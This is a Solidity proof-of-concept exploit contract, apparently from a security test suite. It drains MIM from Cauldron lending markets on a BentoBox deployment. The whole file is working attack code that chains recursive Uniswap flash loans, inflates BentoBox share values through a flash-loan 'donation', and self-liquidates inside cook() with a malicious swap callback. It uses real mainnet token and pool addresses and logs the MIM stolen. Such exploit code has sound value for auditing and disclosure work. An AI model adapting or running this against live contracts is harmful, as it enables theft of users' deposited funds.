// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "@sushiswap/core/contracts/uniswapv2/interfaces/IUniswapV2Factory.sol";
import "@sushiswap/core/contracts/uniswapv2/interfaces/IUniswapV2Router02.sol";
import "@sushiswap/core/contracts/uniswapv2/interfaces/IUniswapV2Pair.sol";
import "../interfaces/IBentoBoxV1.sol";
import "../interfaces/ICauldron.sol";
import "../interfaces/IERC20.sol";
import "hardhat/console.sol";

/*
  Exploit for stealing MIM from a BentoBox deployment.
  For this attack to be possible, all MIM in the BentoBox needs
  to either be borrowable from Cauldron or already controlled by the attacker.
  We'll simulate this by deploying a fresh BentoBox and adding two new Cauldron
  deployment (MIM / SPELL, MIM / xSUSHI).
  In the real world, if only a few users hold BentoBox MIM balances, they
  could collude to steal all MIM added to Cauldron.
*/
contract ExploitCauldronStealMIM {
    IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IBentoBoxV1 bentoBox;

    // All the Cauldron deployments that own MIM shares.
    // will be deployed in the "setup" function.
    address[] cauldrons = new address[](2);
    uint256 N = cauldrons.length;
    uint256 tokenIterator;

    IUniswapV2Factory FACTORY = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address SPELL = 0x090185f2135308BaD17527004364eBcC2D37e5F6;
    address xSUSHI = 0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272;
    address ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address oracleSPELL = 0x1ad386d647c216f3fE5a4fc04f6E4cb83e3048CF;

    /*
    This function deploys the Cauldron deployments to the new BentoBox.
  */
    function setup(address _bentoBox, address masterContract) external {
        bentoBox = IBentoBoxV1(_bentoBox);

        cauldrons[0] = bentoBox.deploy(
            masterContract,
            abi.encode(
                xSUSHI,
                ICauldron(0x98a84EfF6e008c5ed0289655CcdCa899bcb6B99F).oracle(),
                ICauldron(0x98a84EfF6e008c5ed0289655CcdCa899bcb6B99F).oracleData(),
                uint64(158440439),
                uint256(105000),
                uint256(85000),
                uint256(500)
            ),
            true
        );

        cauldrons[1] = bentoBox.deploy(
            masterContract,
            abi.encode(SPELL, oracleSPELL, bytes(""), uint64(158440439), uint256(105000), uint256(85000), uint256(500)),
            true
        );

        bentoBox.setMasterContractApproval(address(this), masterContract, true, 0, bytes32(0), bytes32(0));

        uint256 amount = IERC20(MIM).balanceOf(address(this)) / 2;

        // we deposit MIM and add as asset
        IERC20(MIM).transfer(address(bentoBox), amount);
        bentoBox.deposit(MIM, address(bentoBox), cauldrons[0], amount, 0);
        //ICauldron(cauldrons[0]).addAsset(address(0), false, bentoBox.balanceOf(MIM, address(this)));

        IERC20(MIM).transfer(address(bentoBox), amount);
        bentoBox.deposit(MIM, address(bentoBox), cauldrons[1], amount, 0);
        //ICauldron(cauldrons[1]).addAsset(address(0), false, bentoBox.balanceOf(MIM, address(this)));
    }

    /*
    Entry point for the exploit.
  */
    function start() external {
        uint256 balance = IERC20(MIM).balanceOf(address(this));
        console.log("Attacker's initial MIM balance:", balance);

        // we'll need to recursively flash loan different tokens from
        // uniswap pairs (unfortunately, BentoBox doesn't have enough for us)

        tokenIterator = 0;
        obtainFlashLoan();

        uint256 finalBalance = IERC20(MIM).balanceOf(address(this));
        console.log("Attacker's final MIM balance:", finalBalance);
        require(finalBalance > balance, "not profitable");
        console.log("Attacker's profit:", finalBalance - balance);
    }

    /*
    Logic for obtaining the flash loans.
    Will be called recursively for each collateral.
  */
    function obtainFlashLoan() public {
        address token = ICauldron(cauldrons[tokenIterator]).collateral();

        // calculate how much we need
        ICauldron(cauldrons[tokenIterator]).updateExchangeRate();
        (uint256 assetBalance, uint256 needed) = calculateCollateralNeeded(ICauldron(cauldrons[tokenIterator]));

        // obtain pair token/WETH as it's likely the one with most liquidity
        // for the flash loan
        address uniswapPair;

        if (token == xSUSHI) {
            uniswapPair = 0x36e2FCCCc59e5747Ff63a03ea2e5C0c2C14911e7;
        } else {
            uniswapPair = 0xb5De0C3753b6E1B4dBA616Db82767F17513E6d4E; // FACTORY.getPair(WETH, token);
        }

        console.log("Borrowing from uniswap pair:", uniswapPair);

        uint256 amount0 = IUniswapV2Pair(uniswapPair).token0() == token ? needed : 0;
        uint256 amount1 = IUniswapV2Pair(uniswapPair).token1() == token ? needed : 0;

        // execute the swap for the flash loan
        IUniswapV2Pair(uniswapPair).swap(amount0, amount1, address(this), bytes("0"));
    }

    /*
    Call back from uniswap pair flash loan.
  */
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        console.log("Flash loaning token", tokenIterator);

        if (tokenIterator < N - 1) {
            tokenIterator++;
            obtainFlashLoan();
        } else {
            // if this is the last token we continue the attack logic
            continueAttack();
        }

        repayUniswapFlashLoan(amount0, amount1);
    }

    /*
    Core logic of the exploit.
  */
    function continueAttack() internal {
        console.log("All flash loans obtained, performing attack.");

        // Add collateral in each kashi pair and borrow asset
        for (uint256 i = 0; i < N; i++) {
            console.log("Borrowing from Kashi Pair", cauldrons[i]);
            ICauldron pair = ICauldron(cauldrons[i]);

            address token = pair.collateral();

            IERC20(token).approve(address(bentoBox), type(uint256).max);

            console.log("token balance", IERC20(token).balanceOf(address(this)));

            bentoBox.deposit(IERC20(token), address(this), address(this), IERC20(token).balanceOf(address(this)), 0);

            pair.addCollateral(address(this), false, bentoBox.balanceOf(IERC20(token), address(this)));

            pair.borrow(address(this), bentoBox.balanceOf(MIM, address(pair)));

            require(bentoBox.balanceOf(MIM, address(pair)) == 0, "didn't borrow everything");
        }

        // validate that we own all shares of the asset
        (uint256 elastic, uint256 base) = bentoBox.totals(MIM);
        console.log("shares/total", bentoBox.balanceOf(MIM, address(this)), base);
        require(bentoBox.balanceOf(MIM, address(this)) == base, "not only owner of shares!");

        // Now for each pair, perform the accounting trick, then the liquidation
        // inside a cook, then borrow back the residue paid to the pair (tiny amount)

        for (uint256 i = 0; i < N; i++) {
            ICauldron pair = ICauldron(cauldrons[i]);

            // we perform the accounting trick to inflate the value of
            accountingTrick();

            // calculate how much collateral we need to remove
            // needs to be enough to enable liquidation
            // but not so much that liquidation doesn't work (5% extra margin)
            uint256 collateralToRemove = pair.userCollateralShare(address(this)) / 10;

            // set up cook arrays
            uint8[] memory actions = new uint8[](2);
            uint256[] memory values = new uint256[](actions.length);
            bytes[] memory datas = new bytes[](actions.length);

            // First action is removing collateral
            actions[0] = 4;
            values[0] = 0;
            datas[0] = abi.encode(collateralToRemove, address(this));

            // Second action is calling this contract so it can call liquidate
            // (no "liquidate_action" :(
            actions[1] = 30;
            values[1] = 0;
            datas[1] = abi.encode(address(this), abi.encodeWithSelector(this.liquidation.selector, i), false, false, 0);

            pair.cook(actions, values, datas);

            // remove any collateral left in the kashi pair
            pair.removeCollateral(address(this), pair.userCollateralShare(address(this)));

            // Now we need to borrow again the tiny amount of shares paid back to the
            // pair. Otherwise the next iteration will fail because we're not the
            // only owner of shares
            (uint256 amountToBorrow, uint256 collateralToAdd) = calculateCollateralNeeded(pair);

            pair.addCollateral(address(this), false, collateralToAdd);
            pair.borrow(address(this), amountToBorrow);
        }

        // withdraw all MIM shares for profit
        bentoBox.withdraw(MIM, address(this), address(this), 0, bentoBox.balanceOf(MIM, address(this)));

        uint256 balance = IERC20(MIM).balanceOf(address(this));
        console.log("Amount of MIM stolen:", balance);
    }

    /*
    Performs the accounting trick to increase share value.
    Withdraws all shares, then deposits back just 1 share.
    "Donates" some value to the share via a flash loan fee.
  */
    function accountingTrick() internal {
        IERC20 token = IERC20(MIM);

        console.log("performing accounting trick to increase share value");
        console.log("withdrawing all tokens minus one unit");
        bentoBox.withdraw(token, address(this), address(this), 0, bentoBox.balanceOf(token, address(this)));

        token.approve(address(bentoBox), type(uint256).max);

        bentoBox.deposit(token, address(this), address(this), 0, 1);

        console.log("use flashloan to increase value of share");
        token.transfer(address(bentoBox), IERC20(token).balanceOf(address(this)));

        bentoBox.flashLoan(address(this), address(bentoBox), token, token.balanceOf(address(bentoBox)), bytes(""));

        console.log("bentobox flash loan completed and share value increased.");
    }

    /*
    Called by BentoBox in a flash loan.
    NOOP as all we want is to "donate" value to the shares.
  */
    function onFlashLoan(
        address sender,
        IERC20 _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {
        console.log("inside bentobox flash loan");
    }

    /*
      Called by Cauldron inside the "cook" function.
      We need this because there isn't a liquidation action.
   */
    function liquidation(uint256 i) external {
        IERC20 token = IERC20(MIM);
        ICauldron pair = ICauldron(cauldrons[i]);

        console.log("Starting liquidation...");

        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = pair.userBorrowPart(address(this));
        console.log("borrow part", maxBorrowParts[0]);

        console.log("Calling liquidate...");
        try pair.liquidate(users, maxBorrowParts, address(this), address(this)) {
            console.log("Liquidation successful.");
        } catch (bytes memory reason) {
            console.log("Error during liquidation:", string(reason));
            revert();
        }
    }

    /*
      This will be called by the Cauldron during liquidation.
      We reset the value of the bento share, so as to trick
      the Cauldron into accepting a tiny payment.
   */
    function swap(
        address fromToken,
        address toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom
    ) external returns (uint256 extraShare, uint256 shareReturned) {
        console.log("Inside swap...");

        // reset share value by withdrawing everything then depositing again
        bentoBox.withdraw(MIM, address(this), address(this), 0, bentoBox.balanceOf(MIM, address(this)));

        bentoBox.deposit(MIM, address(bentoBox), address(this), IERC20(MIM).balanceOf(address(bentoBox)), 0);

        console.log("exiting swap.");
    }

    /*
     Calculates how much collateral we need to borrow the entire balance of the
     Cauldron contract.
   */
    function calculateCollateralNeeded(ICauldron pair) internal view returns (uint256 assetBalance, uint256 collateralNeeded) {
        uint256 exchangeRate = pair.exchangeRate();

        assetBalance = bentoBox.toAmount(address(MIM), bentoBox.balanceOf(MIM, address(pair)), true);

        // use same formula as "isSolvent" for open collateralization
        // let's add another 1% just to be sure rounding doesn't screw us.
        collateralNeeded = bentoBox.toShare(pair.collateral(), (assetBalance * exchangeRate * 100) / 84 / 1e18, true) + 1;
    }

    /*
      Logic for repaying uniswap flash loans.
   */
    function repayUniswapFlashLoan(uint256 amount0, uint256 amount1) private {
        IUniswapV2Pair uniswapPair = IUniswapV2Pair(msg.sender);

        IERC20 collateral = amount0 > 0 ? IERC20(uniswapPair.token0()) : IERC20(uniswapPair.token1());

        uint256 due = amount0 > 0 ? amount0 : amount1;
        due = (due * 1005) / 1000;

        // withdraw any shares we might have
        // we have to deal with a corner case of collateral left being dust.
        (uint256 elastic, uint256 base) = bentoBox.totals(collateral);
        uint256 shareBalance = bentoBox.balanceOf(collateral, address(this));
        uint256 removable = shareBalance;
        if (base < 1000 + shareBalance && base != shareBalance) {
            if (shareBalance < 1000) {
                removable = 0;
            } else {
                removable = shareBalance - 1000;
            }
        }

        bentoBox.withdraw(collateral, address(this), address(this), 0, removable);

        // if we don't have enough collateral, we'll need to swap some MIM to get it
        if (due > collateral.balanceOf(address(this))) {
            uint256 missing = due - collateral.balanceOf(address(this));

            (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = uniswapPair.getReserves();

            {
                // then we're in a pair with WETH so let's sell some MIM for WETH
                // and pay the loan in WETH.
                uint256 missingWeth;

                uint256 collateralReserve = address(collateral) == uniswapPair.token0() ? reserve0 : reserve1;
                uint256 wethReserve = WETH == uniswapPair.token0() ? reserve0 : reserve1;

                missingWeth = (missing * wethReserve) / collateralReserve;

                console.log("Missing WETH", missingWeth);

                address[] memory path = new address[](2);
                path[0] = address(MIM);
                path[1] = WETH;

                IERC20(MIM).approve(ROUTER, type(uint256).max);
                console.log("Swapping MIM for WETH...");

                try
                    IUniswapV2Router02(ROUTER).swapTokensForExactTokens(
                        missingWeth,
                        type(uint256).max,
                        path,
                        address(this),
                        type(uint256).max
                    )
                {} catch (bytes memory error) {
                    console.log("Error in router:", string(error));
                    revert();
                }

                IERC20(WETH).transfer(msg.sender, missingWeth);
            }
        }

        collateral.transfer(msg.sender, collateral.balanceOf(address(this)));
    }
}
